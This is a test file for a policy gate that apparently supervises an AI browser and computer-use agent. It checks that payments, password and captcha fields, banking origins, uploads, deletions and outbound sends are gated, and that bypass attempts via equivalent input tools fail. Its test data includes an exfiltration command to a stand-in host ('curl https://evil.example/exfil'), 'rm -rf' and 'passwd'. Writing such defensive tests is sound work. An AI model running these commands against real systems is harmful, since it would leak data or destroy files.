import assert from "node:assert/strict";
import { describe, it } from "node:test";
import {
  evaluateEquivalent,
  evaluateGate,
  type GateContext,
  type GateDecision,
} from "../../../src/policy/gate.ts";
import type { EffectSignals } from "../../../src/policy/signals.ts";
import type { CategoriesFile } from "../../../src/policy/categories.ts";
import { originMatchesPattern } from "../../../src/protocol/origin.ts";
import type { ToolName } from "../../../src/types/contracts.ts";

const ORIGIN = "https://app.example.com";
const sets = {
  readable: [ORIGIN, "*.example.com"],
  writable: [ORIGIN, "*.example.com"],
};

function ctx(
  partial: Partial<GateContext> & {
    tool?: ToolName;
    args?: Record<string, unknown>;
    signals?: EffectSignals;
  },
): GateContext {
  const tool = partial.tool ?? partial.call?.tool ?? "browser_click";
  const args = partial.args ?? partial.call?.args ?? {};
  return {
    call: { tool, args },
    signals: partial.signals ?? {},
    origin: partial.origin ?? ORIGIN,
    mode: partial.mode ?? "supervised",
    origin_sets: partial.origin_sets ?? sets,
    kill_switch: partial.kill_switch,
    typed_tos_override: partial.typed_tos_override,
    categories: partial.categories,
    tos: partial.tos,
  };
}

function decisionOf(d: GateDecision): string {
  return d.decision;
}

type Case = {
  name: string;
  input: Parameters<typeof ctx>[0];
  expect: GateDecision["decision"];
  reasonIncludes?: string;
  gate?: string;
};

const EQUIV: ToolName[] = [
  "browser_click",
  "browser_press",
  "browser_type",
  "computer_mouse",
  "computer_key",
  "computer_type",
];

const cases: Case[] = [
  { name: "plain click allow", input: {}, expect: "allow" },
  { name: "snapshot allow", input: { tool: "browser_snapshot" }, expect: "allow" },
  { name: "screenshot allow", input: { tool: "browser_screenshot" }, expect: "allow" },
  { name: "wait allow", input: { tool: "browser_wait" }, expect: "allow" },
  { name: "tabs allow", input: { tool: "browser_tabs" }, expect: "allow" },
  { name: "files_list allow", input: { tool: "files_list" }, expect: "allow" },
  { name: "files_read allow", input: { tool: "files_read" }, expect: "allow" },
  { name: "done allow", input: { tool: "done" }, expect: "allow" },
  { name: "takeover_status allow", input: { tool: "takeover_status" }, expect: "allow" },
  { name: "request_takeover allow", input: { tool: "request_takeover" }, expect: "allow" },

  {
    name: "payment_field → approval",
    input: { signals: { payment_field: true } },
    expect: "require_approval",
    gate: "payment",
    reasonIncludes: "payment",
  },
  {
    name: "checkout_path → approval",
    input: { signals: { checkout_path: true } },
    expect: "require_approval",
    gate: "payment",
  },
  {
    name: "password_field → force_human",
    input: { signals: { password_field: true } },
    expect: "force_human",
    reasonIncludes: "password",
  },
  {
    name: "otp_field → force_human",
    input: { signals: { otp_field: true } },
    expect: "force_human",
    reasonIncludes: "otp",
  },
  {
    name: "webauthn → force_human",
    input: { signals: { webauthn_prompt: true } },
    expect: "force_human",
    reasonIncludes: "webauthn",
  },
  {
    name: "recaptcha iframe → force_human",
    input: {
      signals: {
        captcha_iframes: ["https://www.google.com/recaptcha/api2/bframe"],
      },
    },
    expect: "force_human",
    reasonIncludes: "captcha",
  },
  {
    name: "hcaptcha iframe → force_human",
    input: {
      signals: { captcha_iframes: ["https://js.hcaptcha.com/1/api.js"] },
    },
    expect: "force_human",
    reasonIncludes: "captcha",
  },
  {
    name: "turnstile iframe → force_human",
    input: {
      signals: {
        captcha_iframes: ["https://challenges.cloudflare.com/turnstile"],
      },
    },
    expect: "force_human",
    reasonIncludes: "captcha",
  },
  {
    name: "arkose iframe → force_human",
    input: {
      signals: { captcha_iframes: ["https://client-api.arkoselabs.com/v2"] },
    },
    expect: "force_human",
    reasonIncludes: "captcha",
  },
  {
    name: "browser_upload → approval",
    input: { tool: "browser_upload", args: { paths: ["a.pdf"] } },
    expect: "require_approval",
    gate: "upload",
  },
  {
    name: "file_upload signal → approval",
    input: { signals: { file_upload: true } },
    expect: "require_approval",
    gate: "upload",
  },
  {
    name: "files_delete → approval",
    input: { tool: "files_delete", args: { path: "/workspace/x" } },
    expect: "require_approval",
    gate: "delete",
  },
  {
    name: "shell rm → approval",
    input: { tool: "shell_exec", args: { command: "rm -rf /workspace/out" } },
    expect: "require_approval",
    gate: "delete",
  },
  {
    name: "shell curl → external_send approval",
    input: {
      tool: "shell_exec",
      args: { command: "curl https://evil.example/exfil" },
    },
    expect: "require_approval",
    gate: "external_send",
  },
  {
    name: "connector send → external_send",
    input: {
      tool: "connector_call",
      args: { tool: "send_email", arguments: {} },
    },
    expect: "require_approval",
    gate: "external_send",
  },
  {
    name: "external_send signal",
    input: { signals: { external_send: true } },
    expect: "require_approval",
    gate: "external_send",
  },
  {
    name: "form submit new origin",
    input: {
      signals: { form_submit_origin: "https://pay.other.com" },
    },
    expect: "require_approval",
    gate: "new_domain",
    reasonIncludes: "form_submit",
  },
  {
    name: "browser_type submit new origin",
    input: {
      tool: "browser_type",
      args: { text: "hi", submit: true },
      signals: { form_submit_origin: "https://pay.other.com" },
    },
    expect: "require_approval",
    gate: "new_domain",
  },
  {
    name: "Enter press new origin",
    input: {
      tool: "browser_press",
      args: { key: "Enter" },
      signals: { form_submit_origin: "https://pay.other.com" },
    },
    expect: "require_approval",
    gate: "new_domain",
  },
  {
    name: "navigate new origin supervised without interrupting the task",
    input: {
      tool: "browser_navigate",
      args: { url: "https://example.com/path" },
    },
    expect: "allow",
  },
  {
    name: "navigate new origin strict → deny",
    input: {
      tool: "browser_navigate",
      args: { url: "https://evil.com/path" },
      mode: "strict",
    },
    expect: "deny",
    reasonIncludes: "strict",
  },
  {
    name: "strict act on non-writable origin → deny",
    input: {
      mode: "strict",
      origin: "https://other.com",
      origin_sets: { readable: ["https://other.com"], writable: [] },
    },
    expect: "deny",
    reasonIncludes: "strict",
  },
  {
    name: "chase.com → force_human banking",
    input: { origin: "https://secure.chase.com/transfer" },
    expect: "force_human",
    reasonIncludes: "banking",
  },
  {
    name: "1password → force_human",
    input: { origin: "https://my.1password.com/vault" },
    expect: "force_human",
    reasonIncludes: "password",
  },
  {
    name: "irs.gov → force_human",
    input: { origin: "https://www.irs.gov/payments" },
    expect: "force_human",
  },
  {
    name: "linkedin tos block",
    input: { origin: "https://www.linkedin.com/messaging" },
    expect: "deny",
    reasonIncludes: "tos_block",
  },
  {
    name: "whatsapp tos block",
    input: { origin: "https://web.whatsapp.com" },
    expect: "deny",
    reasonIncludes: "tos_block",
  },
  {
    name: "tos block with typed override → continue",
    input: {
      origin: "https://www.linkedin.com/feed",
      typed_tos_override: true,
      // still force_human? linkedin not in force_human categories — allow after override
    },
    expect: "allow",
  },
  {
    name: "kill_switch deny",
    input: { kill_switch: true },
    expect: "deny",
    reasonIncludes: "kill_switch",
  },
  {
    name: "shell passwd → secret_entry",
    input: { tool: "shell_exec", args: { command: "passwd alice" } },
    expect: "require_approval",
    gate: "secret_entry",
  },
  {
    name: "navigate allowlisted origin allow",
    input: {
      tool: "browser_navigate",
      args: { url: "https://app.example.com/page2" },
    },
    expect: "allow",
  },
  {
    name: "form submit to writable origin allow",
    input: {
      signals: { form_submit_origin: ORIGIN },
    },
    expect: "allow",
  },
  {
    name: "benign captcha origin no match allow",
    input: {
      signals: { captcha_iframes: ["https://cdn.example.com/widget.js"] },
    },
    expect: "allow",
  },
  {
    name: "coinbase force_human",
    input: { origin: "https://www.coinbase.com/trade" },
    expect: "force_human",
  },
  {
    name: "godaddy force_human",
    input: { origin: "https://dcc.godaddy.com/domains" },
    expect: "force_human",
  },
  {
    name: "connector delete → delete gate",
    input: {
      tool: "connector_call",
      args: { tool: "delete_message", arguments: {} },
    },
    expect: "require_approval",
    gate: "delete",
  },
];

describe("policy gate table", () => {
  it(`runs ${cases.length} cases`, () => {
    assert.ok(cases.length >= 40, `need ≥40 cases, got ${cases.length}`);
  });

  for (const c of cases) {
    it(c.name, () => {
      const d = evaluateGate(ctx(c.input));
      assert.equal(decisionOf(d), c.expect, JSON.stringify(d));
      if (c.reasonIncludes && "reason" in d) {
        assert.match(d.reason, new RegExp(c.reasonIncludes, "i"));
      }
      if (c.gate && d.decision === "require_approval") {
        assert.equal(d.gate, c.gate);
      }
    });
  }
});

describe("equivalent primitives share gate", () => {
  it("payment signal same decision across click/press/coords/type", () => {
    const decisions = evaluateEquivalent(EQUIV, {
      signals: { payment_field: true },
      origin: ORIGIN,
      mode: "supervised",
      origin_sets: sets,
      args: { key: "Enter", text: "x\n" },
    });
    assert.equal(decisions.length, EQUIV.length);
    for (const d of decisions) {
      assert.equal(d.decision, "require_approval");
      if (d.decision === "require_approval") assert.equal(d.gate, "payment");
    }
  });

  it("password signal force_human across equivalent tools", () => {
    const decisions = evaluateEquivalent(EQUIV, {
      signals: { password_field: true },
      origin: ORIGIN,
      mode: "supervised",
      origin_sets: sets,
    });
    for (const d of decisions) {
      assert.equal(d.decision, "force_human");
    }
  });

  it("bypass attempt: computer_mouse on payment still gated", () => {
    const d = evaluateGate(
      ctx({
        tool: "computer_mouse",
        args: { action: "click", x: 10, y: 10 },
        signals: { payment_field: true },
      }),
    );
    assert.equal(d.decision, "require_approval");
  });

  it("bypass attempt: computer_type newline submit new origin", () => {
    const d = evaluateGate(
      ctx({
        tool: "computer_type",
        args: { text: "hello\n" },
        signals: { form_submit_origin: "https://pay.evil.com" },
      }),
    );
    assert.equal(d.decision, "require_approval");
    if (d.decision === "require_approval") assert.equal(d.gate, "new_domain");
  });

  it("bypass attempt: browser_press Enter on captcha still force_human", () => {
    const d = evaluateGate(
      ctx({
        tool: "browser_press",
        args: { key: "Enter" },
        signals: {
          captcha_iframes: ["https://www.google.com/recaptcha/api2/anchor"],
        },
      }),
    );
    assert.equal(d.decision, "force_human");
  });
});

describe("force-human categories and exact-host patterns", () => {
  const categories: CategoriesFile = {
    version: 1,
    force_human: [{ id: "banking", label: "Banking", example_origins: ["bank.com/"] }],
  };

  it("keeps full-origin approval grants scoped to their scheme and port", () => {
    assert.equal(originMatchesPattern("https://example.com/page", "https://example.com"), true);
    assert.equal(originMatchesPattern("https://example.com:443/page", "https://example.com"), true);
    assert.equal(originMatchesPattern("http://example.com/page", "https://example.com"), false);
    assert.equal(originMatchesPattern("https://example.com:8443/page", "https://example.com"), false);
    assert.equal(originMatchesPattern("https://example.com/page", "https://example.com:8443"), false);
    assert.equal(originMatchesPattern("http://example.com/page", "example.com"), true);
    assert.equal(originMatchesPattern("https://sub.example.com:8443", "https://*.example.com:8443"), true);
    assert.equal(originMatchesPattern("http://sub.example.com:8443", "https://*.example.com:8443"), false);
  });

  it("treats a trailing slash as the whole exact host without path-prefix overmatching", () => {
    assert.equal(originMatchesPattern("https://bank.com/login", "bank.com/"), true);
    assert.equal(originMatchesPattern("https://bank.com.evil.com/login", "bank.com/"), false);
    assert.equal(originMatchesPattern("https://bank.com/login", "bank.com/log"), false);
    assert.equal(originMatchesPattern("https://bank.com/logout", "bank.com/log"), false);
    assert.equal(originMatchesPattern("https://bank.com/log/a", "bank.com/log"), true);
  });

  it("allows navigation away from a force-human origin while keeping acts gated", () => {
    const base = {
      signals: {},
      origin: "https://bank.com/account",
      mode: "supervised" as const,
      origin_sets: { readable: ["safe.example"], writable: ["safe.example"] },
      categories,
    };

    assert.equal(
      evaluateGate({ ...base, call: { tool: "browser_click", args: {} } }).decision,
      "force_human",
    );
    assert.equal(
      evaluateGate({ ...base, call: { tool: "browser_upload", args: { paths: ["x"] } } }).decision,
      "force_human",
    );
    assert.equal(
      evaluateGate({
        ...base,
        call: { tool: "browser_navigate", args: { url: "https://safe.example/home" } },
      }).decision,
      "allow",
    );
  });
});
